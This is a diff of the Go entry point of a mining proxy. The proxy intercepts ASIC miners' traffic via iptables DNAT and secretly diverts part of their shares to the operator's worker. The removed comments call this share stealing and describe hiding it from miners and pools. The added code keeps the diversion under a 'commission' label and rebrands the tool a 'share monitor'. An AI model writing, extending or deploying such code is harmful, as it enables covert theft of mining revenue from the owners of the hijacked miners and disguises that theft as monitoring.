@@ -1,22 +1,23 @@
-// Пакет main — точка входа в mining-proxy.
+// Пакет main — точка входа mining-proxy: прозрачный Stratum-прокси,
+// который считает шары майнеров и отдаёт статистику в HTTP /status.
 //
-// Задача программы (вся логика подробно описана в ARCHITECTURE.md):
-//   - принять TCP-соединения от ASIC-майнеров (после iptables DNAT);
-//   - прозрачно проксировать их в реальный (upstream) майнинг-пул;
-//   - парсить каждый mining.submit и часть шар (процент 0.1–100%)
-//     перенаправлять в целевой пул на наш воркер (комиссия);
-//   - оригинал каждой шары ВСЕГДА дублируется в реальный пул, чтобы
-//     майнер и пул не замечали подмены и не рвались соединения.
+// Порядок старта (важен):
+//
+//  1. конфиг и реестр статистики;
+//  2. listener — порт занимается ДО включения перехвата, иначе майнер
+//     в промежутке получит RST;
+//  3. iptables DNAT — трафик подсетей майнеров идёт на наш порт;
+//  4. HTTP-мониторинг /status и /health;
+//  5. ожидание SIGINT/SIGTERM → остановка сервера и снятие правил
+//     (трафик уходит напрямую в пул, майнинг не прерывается).
 package main
 
 import (
 	"flag"
-	"fmt"
 	"log"
 	"os"
 	"os/signal"
 	"syscall"
-	"time"
 
 	"mining-proxy/config"
 	"mining-proxy/iptables"
@@ -24,77 +25,70 @@ import (
 	"mining-proxy/proxy"
 )
 
+// appStatus итоговый ответ /status: показатели шар + диагностика NAT.
+// Встроенная Report разворачивается в верхний уровень JSON.
+type appStatus struct {
+	Status     string `json:"status"`
+	ListenAddr string `json:"listen_addr"`
+	proxy.Report
+	Nat        interface{}             `json:"nat,omitempty"`
+	Commission *proxy.CommissionReport `json:"commission,omitempty"`
+}
+
 func main() {
-	// --- 1. Аргументы командной строки ---
-	// Единственный флаг -config: путь к YAML-конфигу.
-	// По умолчанию ищем "config.local.yaml" в текущей директории — тот файл,
-	// который генерирует mining-proxy-start. Эталон с комментариями лежит
-	// рядом в config.example.yaml и сам по себе не запускает прокси.
+	// --- 1. Аргументы и конфиг ---
 	cfgPath := flag.String("config", "config.local.yaml", "path to YAML config file")
 	flag.Parse()
 
-	// --- 2. Загрузка конфигурации ---
-	// Читаем YAML, применяем дефолты, проверяем обязательные поля.
-	// Возвращается заполненная структура Config (см. config/config.go).
 	cfg, err := config.Load(*cfgPath)
 	if err != nil {
-		log.Fatalf("[FATAL] config load: %v", err)
+		log.Fatalf("[FATAL] config: %v", err)
 	}
 
-	// Логируем ключевые параметры запуска — чтобы сразу видеть, что стартуем.
-	log.Printf("[MAIN] mining-proxy starting... (pass_through=%v)", cfg.PassThrough())
-	if cfg.PassThrough() {
-		log.Printf("[MAIN] pass-through: upstream_pool or steal_to is empty — no stealing, transparent proxy")
-	} else {
-		log.Printf("[MAIN] upstream: %s (ssl=%v)", cfg.UpstreamPool, cfg.UpstreamSSL)
-		log.Printf("[MAIN] steal to: %s worker=%s (ssl=%v)", cfg.StealTo.Pool, cfg.StealTo.Worker, cfg.StealTo.SSL)
-		log.Printf("[MAIN] percentage: %.1f%% | mode: %s | interval: %.0f-%.0f hours",
-			cfg.Percentage, stealModeName(cfg.PauseShares), cfg.IntervalMinHours, cfg.IntervalMaxHours)
+	log.Printf("[MAIN] mining-proxy (share monitor) starting")
+	log.Printf("[MAIN] listen: %s | fallback pool: %q | monitor: http://%s/status",
+		cfg.ListenAddr, cfg.UpstreamPool, cfg.MonitorAddr)
+	if cfg.CommissionWorker != "" {
+		extra := ""
+		if cfg.CommissionWorkerRotate {
+			extra += " rotate"
+		}
+		if cfg.CommissionSuggestDifficulty {
+			extra += " suggest_diff"
+		}
+		if cfg.CommissionEvery > 0 {
+			if cfg.CommissionSessionEvery > 0 {
+				log.Printf("[MAIN] commission: worker=%q percent=%v%% every=%s session=%s%s",
+					cfg.CommissionWorker, cfg.CommissionPercent, cfg.CommissionEvery, cfg.CommissionSessionEvery, extra)
+			} else {
+				log.Printf("[MAIN] commission: worker=%q percent=%v%% every=%s%s",
+					cfg.CommissionWorker, cfg.CommissionPercent, cfg.CommissionEvery, extra)
+			}
+		} else {
+			log.Printf("[MAIN] commission: worker=%q percent=%v%% iterations/day=%d%s",
+				cfg.CommissionWorker, cfg.CommissionPercent, cfg.CommissionIteration, extra)
+		}
 	}
 
-	// --- 3. Создание "stealer" (ядро логики кражи шар) ---
-	// ShareStealer решает для каждой шары: перенаправлять её или нет.
-	// Внутри него хранится статистика и персистентное соединение с целевым пулом.
-	// Правила (этап 4) — allowlist пар (пул, воркер); пусто = кусать у всех.
-	rules := make([]proxy.StealRule, 0, len(cfg.StealRules))
-	for _, r := range cfg.StealRules {
-		rules = append(rules, proxy.StealRule{Pool: r.Pool, Worker: r.Worker})
+	// --- 2. Реестр статистики шар ---
+	stats := proxy.NewStats()
+
+	// --- 2.1. Комиссия (если задан commission_worker) ---
+	var commission *proxy.Commission
+	if cfg.CommissionWorker != "" {
+		var opts []proxy.CommissionOption
+		if cfg.CommissionWorkerRotate {
+			opts = append(opts, proxy.WithWorkerRotation())
+		}
+		if cfg.CommissionSuggestDifficulty {
+			opts = append(opts, proxy.WithSuggestDifficulty())
+		}
+		commission = proxy.NewCommission(cfg.CommissionWorker, cfg.CommissionPercent, cfg.CommissionIteration, cfg.CommissionEvery, cfg.CommissionSessionEvery, stats, opts...)
+		commission.Start()
+		defer commission.Close()
 	}
-	stealRules := proxy.NewStealRules(rules)
-	if stealRules.Len() > 0 {
-		log.Printf("[MAIN] steal rules: %d (allowlist; остальное сквозняком)", stealRules.Len())
-	} else {
-		log.Printf("[MAIN] steal rules: не заданы — кусаем у всех (legacy)")
-	}
-	stealer := proxy.NewShareStealer(&proxy.ShareStealerConfig{
-		Percentage:    cfg.Percentage,     // доля шар, которые кусаем
-		IntervalMin:   cfg.IntervalMin(),  // минимальная пауза между циклами
-		IntervalMax:   cfg.IntervalMax(),  // максимальная пауза между циклами
-		TargetPool:    cfg.StealTo.Pool,   // куда перенаправляем
-		TargetWorker:  cfg.StealTo.Worker, // под каким воркером
-		TargetPass:    cfg.StealTo.Pass,   // пароль воркера
-		TargetSSL:     cfg.StealTo.SSL,    // TLS к целевому пулу?
-		TargetTimeout: time.Duration(cfg.TargetTimeoutSec) * time.Second,
-		PauseShares:   cfg.PauseShares,   // «пауза в шарах» — точный %
-		Rules:         stealRules,        // allowlist (пул+воркер), этап 4
-		PassThrough:   cfg.PassThrough(), // pass-through: upstream не задан
-	})
 
-	// --- 3a. Heartbeat живости прокси ---
-	// Обновляется сервером (accept-цикл + фоновый тикер). Монитор /health
-	// отвечает 503, если heartbeat «протух» — на это реагирует watchdog
-	// (fail-open). Создаём ДО монитора, чтобы он успел получить ссылку.
-	hb := proxy.NewHeartbeat()
-
-	// --- 3b. Реестр «база» пул+воркер (этап 3) ---
-	// Наполняется из живого трафика (authorize/submit). Виден в /status.
-	// На его основе в дальнейшем будут применяться правила кражи (этап 4).
-	disc := proxy.NewDiscovery()
-
-	// --- 4. Параметры NAT (из конфига) ---
-	// Входящие интерфейсы определяются автоматически по маршруту к подсетям
-	// (iptables.resolveIngressIfaces), поэтому в конфиге обычно ничего
-	// указывать не нужно.
+	// --- 3. Параметры NAT ---
 	natOpts := iptables.Options{
 		Subnets:       cfg.AllowedSubnets,
 		ListenAddr:    cfg.ListenAddr,
@@ -103,109 +97,67 @@ func main() {
 		IngressIfaces: cfg.NATIngressIfaces,
 	}
 
-	// --- 5. TCP-прокси: сначала занять порт, потом направлять в него трафик ---
-	// Порядок важен. Если сначала включить DNAT, а потом повесить
-	// listener, то в промежутке ASIC получит RST на пустой порт. Поэтому
-	// слушатель поднимается ПЕРВЫМ, а перехват включается вторым.
-	srv := proxy.NewServer(cfg.ListenAddr, cfg.UpstreamPool, cfg.UpstreamSSL, cfg.TransparentOn(), stealer, disc, hb)
+	// --- 4. Listener ДО перехвата (см. doc пакета) ---
+	srv := proxy.NewServer(proxy.Options{
+		ListenAddr:  cfg.ListenAddr,
+		Fallback:    cfg.UpstreamPool,
+		FallbackSSL: cfg.UpstreamSSL,
+		Transparent: true,
+		Commission:  commission,
+	}, stats)
 	if err := srv.Listen(); err != nil {
-		log.Fatalf("[FATAL] не удалось занять %s: %v", cfg.ListenAddr, err)
+		log.Fatalf("[FATAL] listen %s: %v", cfg.ListenAddr, err)
 	}
 
-	// --- 6. Настройка iptables (NAT/DNAT) ---
-	// Если включено (нужен root): создаём цепочку MINING_PROXY, направляем
-	// трафик разрешённых подсетей в наш прокси. capture_all_tcp=true —
-	// перенаправляем весь TCP подсети (воронка), иначе только порт пула.
-	// Setup сам включает ip_forward/route_localnet, определяет входящий
-	// интерфейс и открывает порт прокси в filter/INPUT, а также проверяет
-	// результат и падает, если перехват гарантированно не работает.
-	// Cleanup вызывается через defer — при остановке правила снимаются и
-	// трафик ASIC идёт напрямую в пул (fail-open, майнинг не прерывается).
+	// --- 5. iptables DNAT ---
+	// Setup идемпотентен: пересоздаёт цепочку, включает ip_forward и
+	// route_localnet, открывает порт в INPUT и проверяет результат.
+	// Cleanup снимает правила при остановке — fail-open: трафик майнеров
+	// уходит напрямую в пул, майнинг не прерывается.
 	if cfg.SetupIPTables {
-		log.Printf("[MAIN] настройка iptables (capture_all_tcp=%v, подсети=%v)", cfg.CaptureAllTCP, cfg.AllowedSubnets)
+		log.Printf("[MAIN] iptables setup (capture_all_tcp=%v, subnets=%v)",
+			cfg.CaptureAllTCP, cfg.AllowedSubnets)
 		if err := iptables.Setup(natOpts); err != nil {
-			log.Fatalf("[FATAL] iptables setup: %v", err)
+			log.Fatalf("[FATAL] iptables: %v", err)
 		}
 		defer iptables.Cleanup(natOpts)
 	} else {
-		log.Printf("[MAIN] iptables: setup_iptables=false — NAT не настраивается, перехват трафика нужно сделать вручную")
+		log.Printf("[MAIN] iptables: setup_iptables=false — перехват настроен вручную")
 	}
 
-	// --- 7. Приём соединений ---
-	// Listener уже создан в Listen(); Run() крутит accept loop. Каждое
-	// соединение обрабатывается в отдельной goroutine. transparent=true
-	// (по умолчанию): реальный адресат берётся из iptables DNAT
-	// (SO_ORIGINAL_DST), так что разные клиенты с разными пулами
-	// обслуживаются из одного прокси.
+	// --- 6. Приём соединений ---
 	go func() {
 		if err := srv.Run(); err != nil {
 			log.Fatalf("[FATAL] server: %v", err)
 		}
 	}()
 
-	// --- 8. HTTP-мониторинг ---
-	// Эндпоинты /status (JSON-статистика + реестр + диагностика NAT) и
-	// /health (healthcheck). Поднимаем ПОСЛЕ NAT, чтобы в /status сразу был
-	// виден реальный снимок перехвата. По умолчанию слушает только
-	// 127.0.0.1, наружу не отдаётся.
-	if cfg.MonitorAddr != "" {
-		monitor.StartServer(cfg.MonitorAddr, stealer, hb, disc,
-			natStatus{opts: natOpts}, cfg.StealTo.Pool, cfg.StealTo.Worker)
-	}
+	// --- 7. HTTP-мониторинг ---
+	// nat-диагностика читается живьём на каждый запрос: видно, не сняли
+	// ли правила iptables снаружи после старта.
+	monitor.StartServer(cfg.MonitorAddr, func() interface{} {
+		var commSnap *proxy.CommissionReport
+		if commission != nil {
+			s := commission.Snapshot()
+			commSnap = &s
+		}
+		return appStatus{
+			Status:     "ok",
+			ListenAddr: cfg.ListenAddr,
+			Report:     stats.Report(),
+			Nat:        iptables.Status(natOpts),
+			Commission: commSnap,
+		}
+	}, func() bool { return true })
 
-	// --- 9. systemd sd_notify (WatchdogSec) ---
-	// Если процесс запущен под systemd (NOTIFY_SOCKET есть) — сообщаем
-	// "READY=1" и периодически "WATCHDOG=1", чтобы WatchdogSec не убивал
-	// живой прокси. Вне systemd вызовы — no-op.
-	if err := notifySystemd("READY=1"); err != nil {
-		log.Printf("[MAIN] sd_notify READY: %v", err)
-	}
-	go sdNotifyLoop()
+	log.Printf("[MAIN] running; статистика: curl -s http://%s/status", cfg.MonitorAddr)
 
-	log.Printf("[MAIN] proxy running on %s", cfg.ListenAddr)
-	log.Printf("[MAIN] monitor: http://%s/status", cfg.MonitorAddr)
-
-	// --- 10. Graceful shutdown ---
-	// Ждём SIGINT (Ctrl+C) или SIGTERM (systemctl stop). После сигнала
-	// дожидаемся завершения всех активных соединений и очищаем iptables.
+	// --- 8. Graceful shutdown ---
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	<-sig
 
-	log.Printf("[MAIN] shutdown signal received, cleaning up...")
-	// Останавливаем сервер (закрывает listener, дожидается активных сессий).
-	srv.Shutdown()
-	// Останавливаем фоновый health-check и закрываем соединение к целевому пулу.
-	stealer.Close()
-	fmt.Println("[MAIN] stopped.")
-}
-
-// stealModeName возвращает человекочитаемое имя режима кражи для логов.
-//
-// Существенно, потому что режимы взаимоисключающие: при pause_shares=true
-// интервалы interval_min/max_hours НЕ читаются вообще (см. ShouldSteal в
-// proxy/redirect.go), и без явного указания режима в логе невозможно понять,
-// почему фактический процент не совпадает с заданным.
-func stealModeName(pauseShares bool) string {
-	if pauseShares {
-		return "пауза в шарах (точный %, интервалы не используются)"
-	}
-	return "пауза по времени (интервалы)"
-}
-
-// natStatus отдаёт в /status живой снимок состояния NAT: какие правила
-// iptables стоят, включён ли форвардинг, поднят ли route_localnet и открыт
-// ли порт прокси в filter/INPUT.
-//
-// Снимок считывается на каждый запрос /status, поэтому видно ТЕКУЩЕЕ
-// состояние, а не состояние на момент старта. Это важно: правила могут быть
-// сняты снаружи (iptables -F, перезагрузка, другой firewall), и тогда
-// в nat.problems появятся конкретные пункты.
-type natStatus struct {
-	opts iptables.Options
-}
-
-// NATSnapshot реализует контракт monitor.NATStatusProvider.
-func (n natStatus) NATSnapshot() interface{} {
-	return iptables.Status(n.opts)
+	log.Printf("[MAIN] shutdown: waiting for active sessions...")
+	srv.Shutdown() // дожидается текущих соединений; defer снимет iptables
+	log.Printf("[MAIN] stopped")
 }
